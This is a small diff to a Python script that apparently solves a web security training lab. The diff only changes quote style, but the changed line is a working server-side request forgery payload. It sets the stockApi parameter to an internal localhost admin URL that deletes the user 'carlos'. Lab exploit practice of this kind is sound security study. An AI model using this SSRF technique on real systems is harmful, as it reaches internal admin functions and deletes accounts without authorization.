@@ -6,7 +6,7 @@ import sys
 def delete_carlos_user(url):
     try:
         print("(+) Deleting Carlos user...")
-        response = requests.post(f"{url}/product/stock", data={'stockApi': 'http://localhost/admin/delete?username=carlos'}, timeout=10)
+        response = requests.post(f"{url}/product/stock", data={"stockApi": "http://localhost/admin/delete?username=carlos"}, timeout=10)
         if "Congratulations, you solved the lab!" in response.text:
             print("(+) Carlos user successfully deleted")
         else:
